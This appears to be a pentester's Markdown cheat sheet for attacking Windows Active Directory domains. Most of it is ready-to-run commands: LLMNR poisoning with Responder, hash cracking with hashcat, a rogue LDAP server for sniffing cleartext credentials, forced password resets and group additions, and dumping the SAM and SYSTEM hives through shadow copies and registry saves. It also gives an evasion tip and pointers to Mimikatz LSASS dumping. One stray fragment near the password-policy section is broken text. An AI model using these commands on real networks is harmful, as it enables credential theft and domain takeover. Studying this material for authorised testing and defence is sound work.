Great Cheat sheets: [Internal All the Things](https://swisskyrepo.github.io/InternalAllTheThings/)

==AD Methodology: [Hacktricks](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html)

# What is AD?
AD is an identity/security policy management framework for managing large fleets of Windows computers. Windows comes with support for it out of the box. These techniques are grouped together into one note because they are less applicable outside of a domain context. While most organizations to make use of AD DS, it is not always in use. Use this note if and when necessary, and understand it well. 

For Help: an interactive cheat sheet, containing a curated list of offensive security tools and their respective commands, to be used against Windows/AD environments.
[WadComs](https://wadcoms.github.io/)

# Domain Reconnaissance
## Passive
- [[Responder]]
	- Use analysis mode (passive, no responses)
- OSINT
- [[Wireshark]]/[[Tcpdump]]

## Active
- [[Nmap]]
- [[Fping]]
- [[Kerbrute]]
- LOLBins

```shell
systeminfo | findstr Domain # Get domain joined status and name
Get-ADUser -Filter * # Get all AD users
Get-ADUser -Filter * -SearchBase "CN=Users,DC=<name of domain>,DC=COM" # Get more info
```
# LLMNR/NBT-NS Poisoning

LLMNR poisoning works similarly to ARP poisoning. LLMNR is a protocol similar to DNS used inside AD environments. 

- [[Responder]] (Linux Hosts)
- [[Inveigh]] (Windows Hosts)
- [[Hashcat]]

```shell
responder -I <iface> -A # Listen only, do not poison
responder -I <iface> # Poison and intercept responses
```

Poisoning this connection with Responder or Inveigh provides us an opportunity to Falsify the LLMNR name and request authentication. These hashes are NetNTLMv2, which means they cannot be used in PTH attacks, but they can still be cracked with Hashcat in mode 5600. 

```shell
hashcat -m 5600 <NetNTLMv2> <wordlist>
```

This attack can be prevented only by disabling these protocols, which should be done carefully, as we are not always aware of what relies on what within our network. 

# Enumerating Password Policies
- [[Enum4Linux]]
- [[CrackMapExec]]
- [[RPCclient]]

All of these tools rely on an SMB Null session to work if we do not already have domain credentials. From Windows we can try

```shell
net use \\<DC>\ipc$ "" /u:"" # Test if SMB null sessions are allowed 
```

- [[LDAPSearch]]
- [[PowerView]]

 10 pwdHistoryLength
```

From Windows is even easier.

```shell
net accounts
```

# Enumerating Domain Users
- [[LDAPSearch]]
- [[CrackMapExec]]
- [[RPCclient]]
- [[Enum4Linux]]
- [[Kerbrute]]
- LOL Solutions (like the AD module)

# Password Spraying
- [[Kerbrute]]
- [[CrackMapExec]]
- [[DomainPasswordSpray]] (Windows)

Password Spraying can get us one AD User and password pair, which can give us all ad users' hashes via Kerberoasting. 

# Rogue LDAP
If you have control over where LDAP requests are being sent, perhaps on a networked and unsecured printer, you can configure a rogue LDAP server and sniff the cleartext credentials with Wireshark.

```shell
# Start a rogue LDAP server on Kali
apt install slapd ldap-utils
systemctl start slapd
dpkg-reconfigure -p low slapd
<select No>
<enter domain you are attacking/impersonating>
<re-enter domain you are impersonating>
<any password will work>
<select MDB>
<select No>
<select Yes>

echo "dn: cn=config" > olcSaslSecProps.ldif
echo "replace: olcSaslSecProps" >> olcSaslSecProps.ldif
echo "olcSaslSecProps: noanonymous,minssf=0,passcred" >> olcSaslSecProps.ldif

ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif
service slapd restart

tcpdump -SX -i <interface> tcp port 389
```

# Credential Injection
## Runas
```powershell
runas.exe /netonly /user:<domain>\<username> cmd.exe
```

With credential access and a Windows machine you can connect to the domain and use the Microsoft Management Console to enumerate machines and users in the environment. 
# Enumerating Security Controls

This PowerShell will give lots of valuable information about the domain and your privileges within it. 

```powershell
Get-MpComputerStatus # Check for Windows Defender
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections # Get AppLocker Status
$ExecutionContext.SessionState.LanguageMode # Determines PowerShell Execution Language Mode (Constrained or Full access to PS functions)
Find-LAPSDelegatedGroups # Identify LAPS users and groups
Find-AdmPwdExtendedRights # Determine which devices you have access to LAPS on
Get-LAPSComputers # Find LAPS-enabled devices
```

- [[CrackMapExec]]
- [[RPCclient]]
- [[Impacket]]
- [[SMBMap]]
- [[WinDAPSearch]]
- [[BloodHound]]
- [[Powershell ActiveDirectory Module]] (Windows)
- [[PowerView]]
- [[Snaffler]]

# LOL (Living Off the Land) Enumeration Solutions
- [[DSQuery]]
- [[netsh]]

If you can attach your own Windows VM to the domain, you can use these techniques to enumerate from it with [[Runas]] to inject valid AD credentials. 

| **Command**                                             | **Result**                                                                                 |
| ------------------------------------------------------- | ------------------------------------------------------------------------------------------ |
| `hostname`                                              | Prints the PC's Name                                                                       |
| `[System.Environment]::OSVersion.Version`               | Prints out the OS version and revision level                                               |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Prints the patches and hotfixes applied to the host                                        |
| `ipconfig /all`                                         | Prints out network adapter state and configurations                                        |
| `set`                                                   | Displays a list of environment variables for the current session (ran from CMD-prompt)     |
| `echo %USERDOMAIN%`                                     | Displays the domain name to which the host belongs (ran from CMD-prompt)                   |
| `echo %logonserver%`                                    | Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt) |
| `qwinsta`                                               | Print logged-on users                                                                      |

|**Networking Commands**|**Description**|
|---|---|
|`arp -a`|Lists all known hosts stored in the arp table.|
|`ipconfig /all`|Prints out adapter settings for the host. We can figure out the network segment from here.|
|`route print`|Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host.|
|`netsh advfirewall show state`|Displays the status of the host's firewall. We can determine if it is active and filtering traffic.|

## WMI Checks
| **Command**                                                                          | **Description**                                                                                        |
| ------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------ |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn`                              | Prints the patch level and description of the Hotfixes applied                                         |
| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List` | Displays basic host information to include any attributes within the list                              |
| `wmic process list /format:list`                                                     | A listing of all processes on host                                                                     |
| `wmic ntdomain list /format:list`                                                    | Displays information about the Domain and Domain Controllers                                           |
| `wmic useraccount list /format:list`                                                 | Displays information about all local accounts and any domain accounts that have logged into the device |
| `wmic group list /format:list`                                                       | Information about all local groups                                                                     |
| `wmic sysaccount list /format:list`                                                  | Dumps information about any system accounts that are being used as service accounts.                   |
## Net Commands
==If you are trying to be evasive, use ==`net1`==instead of ==`net`

| **Command**                                     | **Description**                                                                                                              |
| ----------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------- |
| `net accounts`                                  | Information about password requirements                                                                                      |
| `net accounts /domain`                          | Password and lockout policy                                                                                                  |
| `net group /domain`                             | Information about domain groups                                                                                              |
| `net group "Domain Admins" /domain`             | List users with domain admin privileges                                                                                      |
| `net group "domain computers" /domain`          | List of PCs connected to the domain                                                                                          |
| `net group "Domain Controllers" /domain`        | List PC accounts of domains controllers                                                                                      |
| `net group <domain_group_name> /domain`         | User that belongs to the group                                                                                               |
| `net groups /domain`                            | List of domain groups                                                                                                        |
| `net localgroup`                                | All available groups                                                                                                         |
| `net localgroup administrators /domain`         | List users that belong to the administrators group inside the domain (the group `Domain Admins` is included here by default) |
| `net localgroup Administrators`                 | Information about a group (admins)                                                                                           |
| `net localgroup administrators [username] /add` | Add user to administrators                                                                                                   |
| `net share`                                     | Check current shares                                                                                                         |
| `net user <ACCOUNT_NAME> /domain`               | Get information about a user within the domain                                                                               |
| `net user /domain`                              | List all users of the domain                                                                                                 |
| `net user %username%`                           | Information about the current user                                                                                           |
| `net use x: \computer\share`                    | Mount the share locally                                                                                                      |
| `net view`                                      | Get a list of computers                                                                                                      |
| `net view /all /domain[:domainname]`            | Shares on the domains                                                                                                        |
| `net view \computer /ALL`                       | List shares of a computer                                                                                                    |
| `net view /domain`                              | List of PCs of the domain                                                                                                    |

# Kerberoasting
- [[Impacket]]
- [[Rubeus]] (Windows)
- [[Hashcat]]
- [[PowerView]]

We can use GetUserSPNs from Impacket to get a TGT to crack with hashcat's mode 13100. Rubeus can be used for the same purpose from Windows. Both can be cracked with Hashcat -m 13100. Kerberoasting can also be performed across different domain with cross-domain trusts. This is especially useful for gaining access across an enterprise or gathering passwords that are not vulnerable in the current domain. 

# Exploiting Dangerous Permissions
Some examples of dangerous permissions include:
- ForceChangePassword
	- User can forcibly change another users' password
- AddMembers
	- Users with this permission can add users, groups, and computers to another group
- GenericAll
	- Complete control over an object
- GenericWrite
	- Update any non-protected parameters of a target object
- WriteOwner
	- Update owner of a target object
- WriteDACL
	- Write new ACEs to the target object's DACL
- AllExtendedRights
	- Permission to perform any action associated with extended AD rights (including for changing password etc.)
- [[BloodHound]]
- [[PowerView]]
- Active Directory Module

```powershell
# Change an account password
$Password = ConvertTo-SecureString "<new pass>" -AsPlainText -Force
Set-ADAccountPassword -Identity "<AD user username>" -Reset -NewPassword $Password

# Add a user to a group
Add-ADGroupMember "IT Support" -Members "<AD user username>" 
```

# Exploiting Constrained Delegation
```powershell
Get-NetUser -TrustedToAuth # Powerview module to get service accounts trusted to authenticate users to services. (Accounts that can request a TGT)
# Use mimikatz or rubeus to get credentials for this user

# Begin a remote powershell session on a target machine (tickets should be in memory for an impersonated user delegating WSMAN and HTTP authority)
$username = “<USERNAME>”  
$password = “<PASSWORD>”  
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force  
$cred = New-Object System.Management.Automation.PSCredential ($username, $securePassword)
New-PSSession -ComputerName <remote server name>
Enter-PSSession -ComputerName <remote server name>
```
- [[Mimikatz]]
- [[PowerView]]
- [[Kekeo]]
- [[BloodHound]]

# Exploiting Certificate Misconfigurations
Four attributes are required for a certificate misconfiguration to lead to privilege escalation:
- Client Authentication
- CT_FLAG_ENROLEE_SUPPLIES_SUBJECT
- CTPRIVATEKEY_FLAG_EXPORTABLE_KEY
- Certificate Permissions

We can view all certificate templates using the following windows utility.

```powershell
certutil -Template -v > templates.txt
```

# Enumerating ACLs

- [[PowerView]]
- [[BloodHound]]

# Abusing ACLs
- [[PowerView]]

# Miscellaneous Misconfigurations
- Exchange Related Group Membership
	- https://github.com/gdedrouas/Exchange-AD-Privesc
- PrivExchange
- Printer Bug
- MS14-068
- IPv6 Bug (CVE-2024-38063)
- Sniffing LDAP Credentials
- Enumerating DNS Records
- PASSWD_NOTREQD
	- [[PowerView]]
- Group Policy Preferences Passwords
- ASREP Roasting
	- [[Rubeus]]
- GPO Abuse

# Domain Trusts
- [[BloodHound]]
- [[Impacket]]
- [[Rubeus]]
- [[Mimikatz]]

If a domain is a child of another domain or forest, you can use default directional trusts to forge a golden ticket. Since the Administrator of the DC of the child domain by default has administrative privileges over the parent domain, we can compromise the entire enterprise with DA on the child domain. 

# Credential Harvesting
- Keylogging
	- [[Meterpreter]]
- Cleartext Credentials
	- Command history
	- Config files
	- Backup files
	- Shared files
	- Registry
		- `reg query <HKLM/HKCU> /f password /t REG_SZ /s
	- Source code
- SAM
	- [[Meterpreter]] hashdump 
	- Volume Shadow Copy
```powershell
wmic shadowcopy call create C:\
vssadmin list shadows

copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam

copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\Administrator\Desktop\system
```
- Registry Hives
```powershell
reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg
reg save HKLM\system C:\users\Administrator\Desktop\system-reg
# From here you can use impacket-secretsDump to read the hashes out. 
```
- LSASS
[[Mimikatz]] can dump and unprotect LSASS using sekurlsa and mimidrv.sys. 

# Additional Resources
https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
https://seamlessintelligence.com.au/sliver_2.html
https://github.com/0xJs/RedTeaming_CheatSheet/blob/main/windows-ad/Domain-Enumeration.md
[https://wadcoms.github.io](https://wadcoms.github.io/)
https://github.com/61106960/adPEAS
